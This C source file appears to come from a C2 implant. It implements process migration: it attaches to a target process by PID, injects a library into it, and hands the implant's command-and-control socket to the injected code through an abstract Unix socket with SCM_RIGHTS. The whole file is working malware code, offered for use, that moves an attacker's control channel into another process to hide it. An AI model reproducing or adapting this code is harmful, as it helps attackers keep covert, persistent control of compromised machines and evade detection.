/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <limits.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#if IS_LINUX
#include <syscall.h>
#endif

#ifndef IS_IPHONE
#include <injector.h>
#endif

#include <c2.h>
#include <log.h>
#include <migrate.h>
#include <net_client.h>

static int shared_listen(const char *name)
{
    int shared;
    struct sockaddr_un address;

    memset(&address, 0, sizeof(address));

    shared = socket(AF_UNIX, SOCK_STREAM, 0);
    address.sun_family = AF_UNIX;
    strcpy(address.sun_path, name);

    address.sun_path[0] = 0;
    bind(shared, (struct sockaddr *)&address, sizeof(address));

    listen(shared, 100);
    return accept(shared, NULL, NULL);
}

static ssize_t shared_send_sock(int shared, const void *buf,
                                size_t length, int sock)
{
    struct iovec iov;
    struct msghdr msg;
    struct cmsghdr *pcmsghdr;

    char buffer[CMSG_SPACE(sizeof(int))];

    iov.iov_base = (void*)buf;
    iov.iov_len = length;
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = buffer;
    msg.msg_controllen = sizeof(buffer);
    msg.msg_flags = 0;

    pcmsghdr = CMSG_FIRSTHDR(&msg);
    pcmsghdr->cmsg_len = CMSG_LEN(sizeof(int));
    pcmsghdr->cmsg_level = SOL_SOCKET;
    pcmsghdr->cmsg_type = SCM_RIGHTS;

    *((int*)CMSG_DATA(pcmsghdr)) = sock;
    return sendmsg(shared, &msg, 0);
}

static int migrate_inject(pid_t pid, char *path, int sock)
{
    int shared;
    char buffer[4];
    injector_t *injector;

    if (injector_attach(&injector, pid) < 0)
    {
        log_debug("Failed to attach to (%d) - (%s)\n", pid, injector_error());
        return -1;
    }

    log_debug("* Attached to the process (%d)\n", pid);

#ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
    injector_inject_in_cloned_thread(injector, path, NULL);
#else
    injector_inject(injector, path, NULL);
#endif

    log_debug("* Injected to the process (%d)\n", pid);

    shared = shared_listen("#IPCSocket");
    memset(buffer, 0, 4);
    shared_send_sock(shared, buffer, 4, sock);

    return 0;
}

int migrate_init(pid_t pid, char *path, c2_t *c2)
{
    net_t *net;
    net = c2->tunnel->data;

    return migrate_inject(pid, path, net->io->pipe[0]);
}